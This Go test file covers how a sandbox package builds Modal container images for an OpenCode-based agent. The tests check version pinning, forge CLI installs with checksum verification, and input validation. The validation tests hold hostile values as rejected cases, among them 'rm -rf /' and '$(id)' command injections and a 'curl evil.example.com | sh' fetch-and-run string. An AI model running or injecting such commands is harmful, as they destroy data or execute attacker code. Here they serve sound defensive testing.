package sandbox

import (
	"context"
	"os/exec"
	"regexp"
	"slices"
	"strings"
	"testing"

	modal "github.com/modal-labs/modal-client/go"

	"github.com/jimutt/spov/internal/toolchain"
)

func TestImageSpecPackages(t *testing.T) {
	t.Run("ripgrep is always present", func(t *testing.T) {
		// Without rg on PATH the server downloads it from GitHub at
		// runtime, which stalls cold start and fails under restricted
		// egress.
		if !slices.Contains(ImageSpec{OpenCodeVersion: "v1"}.Packages(), "ripgrep") {
			t.Error("ripgrep is not in the base package list")
		}
	})

	t.Run("extras are merged, sorted and de-duplicated", func(t *testing.T) {
		s := ImageSpec{OpenCodeVersion: "v1", ExtraPackages: []string{"nodejs", "git", " python3 ", ""}}
		got := s.Packages()
		if !slices.IsSorted(got) {
			t.Errorf("packages are not sorted: %v", got)
		}
		gitCount := 0
		for _, p := range got {
			if p == "git" {
				gitCount++
			}
		}
		if gitCount != 1 {
			t.Errorf("git appears %d times: %v", gitCount, got)
		}
		for _, want := range []string{"nodejs", "python3"} {
			if !slices.Contains(got, want) {
				t.Errorf("%q missing from %v", want, got)
			}
		}
	})
}

func TestImageSpecName(t *testing.T) {
	t.Run("encodes the OpenCode version", func(t *testing.T) {
		name := ImageSpec{OpenCodeVersion: "0.0.0-beta-18684"}.Name()
		if !strings.Contains(name, "0.0.0-beta-18684") {
			t.Errorf("name = %q, want the version embedded", name)
		}
	})

	t.Run("a version bump changes the name", func(t *testing.T) {
		a := ImageSpec{OpenCodeVersion: "0.0.0-beta-1"}.Name()
		b := ImageSpec{OpenCodeVersion: "0.0.0-beta-2"}.Name()
		if a == b {
			t.Errorf("both versions produced %q", a)
		}
	})

	t.Run("base packages produce no suffix", func(t *testing.T) {
		plain := ImageSpec{OpenCodeVersion: "v1"}
		withBase := ImageSpec{OpenCodeVersion: "v1", ExtraPackages: []string{"git"}}
		if plain.Name() != withBase.Name() {
			t.Errorf("re-listing a base package changed the name: %q vs %q", plain.Name(), withBase.Name())
		}
	})

	t.Run("extra packages produce a distinct name", func(t *testing.T) {
		plain := ImageSpec{OpenCodeVersion: "v1"}.Name()
		extra := ImageSpec{OpenCodeVersion: "v1", ExtraPackages: []string{"nodejs"}}.Name()
		if plain == extra {
			t.Error("a package variant collided with the base image name")
		}
		other := ImageSpec{OpenCodeVersion: "v1", ExtraPackages: []string{"python3"}}.Name()
		if extra == other {
			t.Error("two different package variants collided")
		}
	})

	t.Run("package order does not change the name", func(t *testing.T) {
		a := ImageSpec{OpenCodeVersion: "v1", ExtraPackages: []string{"nodejs", "python3"}}.Name()
		b := ImageSpec{OpenCodeVersion: "v1", ExtraPackages: []string{"python3", "nodejs"}}.Name()
		if a != b {
			t.Errorf("reordering the package list changed the name: %q vs %q", a, b)
		}
	})
}

func TestImageSpecDockerfileCommands(t *testing.T) {
	cmds := ImageSpec{OpenCodeVersion: "0.0.0-beta-18684"}.DockerfileCommands()
	joined := strings.Join(cmds, "\n")

	if !strings.Contains(joined, "ripgrep") {
		t.Error("ripgrep is not installed by the Dockerfile")
	}
	// @beta must never be resolved at sandbox start; the version is fixed
	// at build time, and the live install script is never run.
	if !strings.Contains(joined, "-0.0.0-beta-18684.tgz") {
		t.Errorf("the install step does not pin the version:\n%s", joined)
	}
	for _, floating := range []string{"@beta", "@latest", "opencode.ai/v2/install"} {
		if strings.Contains(joined, floating) {
			t.Errorf("the build resolves %s:\n%s", floating, joined)
		}
	}
	// Each command is one Dockerfile line.
	for _, c := range cmds {
		if strings.Contains(c, "\n") {
			t.Errorf("a command spans lines, which Modal's Dockerfile parser reads as a new instruction:\n%s", c)
		}
	}
	if !strings.Contains(joined, "rm -rf /var/lib/apt/lists") {
		t.Error("the apt cache is not cleaned up")
	}
}

func TestImageSpecValidate(t *testing.T) {
	tests := []struct {
		name string
		in   ImageSpec
		ok   bool
	}{
		{"valid", ImageSpec{OpenCodeVersion: "0.0.0-beta-18684"}, true},
		{"valid with extras", ImageSpec{OpenCodeVersion: "v1", ExtraPackages: []string{"nodejs", "libpq-dev", "g++"}}, true},
		{"no version", ImageSpec{}, false},
		{"version with a shell metacharacter", ImageSpec{OpenCodeVersion: "v1; rm -rf /"}, false},
		{"version with a substitution", ImageSpec{OpenCodeVersion: "$(id)"}, false},
		{"package with a metacharacter", ImageSpec{OpenCodeVersion: "v1", ExtraPackages: []string{"nodejs; rm -rf /"}}, false},
		{"package with a backtick", ImageSpec{OpenCodeVersion: "v1", ExtraPackages: []string{"a`id`"}}, false},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := tt.in.Validate()
			if tt.ok && err != nil {
				t.Errorf("Validate: %v", err)
			}
			if !tt.ok && err == nil {
				t.Error("an unsafe spec was accepted")
			}
		})
	}
}

// TestImageSpecRejectsInjectionBeforeRendering pins the ordering: nothing
// unsafe should reach DockerfileCommands, because Validate runs first in
// EnsureImage.
func TestImageSpecRejectsInjectionBeforeRendering(t *testing.T) {
	bad := ImageSpec{OpenCodeVersion: "v1 && curl evil.example.com | sh"}
	if err := bad.Validate(); err == nil {
		t.Fatal("an injectable version was accepted")
	}
}

func TestEnsureImageValidatesBeforeBuilding(t *testing.T) {
	// A nil client would panic on any Modal call, so reaching the build
	// at all proves validation did not run first.
	p := &ModalProvider{images: map[string]*modal.Image{}}
	if _, err := p.EnsureImage(context.Background(), ImageSpec{}); err == nil {
		t.Fatal("an invalid image spec was accepted")
	}
}

// TestImageNameChangesWithToolVersions: a CLI bump produces a different
// image, or spov would silently boot the previous one without the new
// tools. The name hashes every rendered command, and the commands carry
// the versions.
//
// @decision(DL-032)
func TestImageNameChangesWithToolVersions(t *testing.T) {
	spec := ImageSpec{OpenCodeVersion: "v1"}
	before := spec.Name()

	cmds := spec.DockerfileCommands()
	if !strings.HasSuffix(before, shortHash(baseImage+"\n"+strings.Join(cmds, "\n"))) {
		t.Errorf("name %q does not hash the rendered recipe", before)
	}
	joined := strings.Join(cmds, "\n")
	for _, v := range []string{TeaVersion, GhVersion} {
		if !strings.Contains(joined, v) {
			t.Errorf("the recipe does not carry %s, so a bump would not change the name", v)
		}
	}

	// Extra packages and tool versions must not collide.
	withExtras := ImageSpec{OpenCodeVersion: "v1", ExtraPackages: []string{"nodejs"}}.Name()
	if withExtras == before {
		t.Error("a package variant collided with the base image")
	}
}

// TestImageInstallsForgeCLIs: an agent that can clone but cannot open a
// pull request leaves the job half done.
//
// @decision(DL-032)
func TestImageInstallsForgeCLIs(t *testing.T) {
	joined := strings.Join(ImageSpec{OpenCodeVersion: "v1"}.DockerfileCommands(), "\n")

	for _, want := range []string{
		"tea-" + TeaVersion + "-linux-",
		"gh_" + GhVersion + "_linux_",
		"tea --version && gh --version",
	} {
		if !strings.Contains(joined, want) {
			t.Errorf("the build does not contain %q:\n%s", want, joined)
		}
	}
	// Architecture must not be hardcoded: Modal may schedule arm64.
	if strings.Contains(joined, "linux_amd64") || strings.Contains(joined, "linux-amd64") {
		t.Error("the CLI downloads hardcode amd64")
	}
	if !strings.Contains(joined, "dpkg --print-architecture") {
		t.Error("the CLI downloads do not resolve the architecture at build time")
	}
}

// TestAResolvedSpecIsValidatedAndNamedApart: a resolved version must be
// one Resolve accepts, and the exact build's name differs from the
// request's, which is the name images built before resolution have.
//
// @decision(DL-033) @decision(DL-016)
func TestAResolvedSpecIsValidatedAndNamedApart(t *testing.T) {
	sel, err := toolchain.Parse([]string{"node@22", "postgres@14"})
	if err != nil {
		t.Fatal(err)
	}
	exact, err := toolchain.ResolveTo(sel, []string{"node@22.23.3", "postgres@14.24"})
	if err != nil {
		t.Fatal(err)
	}
	spec := ImageSpec{OpenCodeVersion: "2.0.22", Addons: exact}
	if err := spec.Validate(); err != nil {
		t.Fatal(err)
	}
	requested := spec.Requested()
	if requested.Name() == spec.Name() || requested.Name() != (ImageSpec{OpenCodeVersion: "2.0.22", Addons: sel}).Name() {
		t.Errorf("request %s, exact %s", requested.Name(), spec.Name())
	}
	for _, forged := range []string{"22.23.3; rm -rf /", "23.1.0", "22"} {
		bad := spec
		bad.Addons = append([]toolchain.Selection(nil), exact...)
		bad.Addons[0].Resolved = forged
		if err := bad.Validate(); err == nil {
			t.Errorf("a forged resolved version %q was accepted", forged)
		}
	}
}

// Every forge CLI has a sha256 for each architecture the image builds on,
// and each install command checks it.
//
// @decision(DL-032)
func TestEveryForgeCLIIsChecked(t *testing.T) {
	hex64 := regexp.MustCompile(`^[0-9a-f]{64}$`)
	for cli, sums := range cliSHA256 {
		for _, arch := range []string{"amd64", "arm64"} {
			if !hex64.MatchString(sums[arch]) {
				t.Errorf("%s %s: sha256 %q", cli, arch, sums[arch])
			}
		}
	}
	for name, cmd := range map[string]string{"tea": teaInstallCommand(), "gh": ghInstallCommand(), "glab": glabInstallCommand()} {
		if !strings.Contains(cmd, "sha256sum -c -") || !strings.Contains(cmd, cliSHA256[name]["arm64"]) {
			t.Errorf("%s does not check its checksum: %s", name, cmd)
		}
		if out, err := exec.Command("sh", "-n", "-c", strings.TrimPrefix(cmd, "RUN ")).CombinedOutput(); err != nil {
			t.Errorf("%s does not parse under sh: %v\n%s", name, err, out)
		}
	}
}
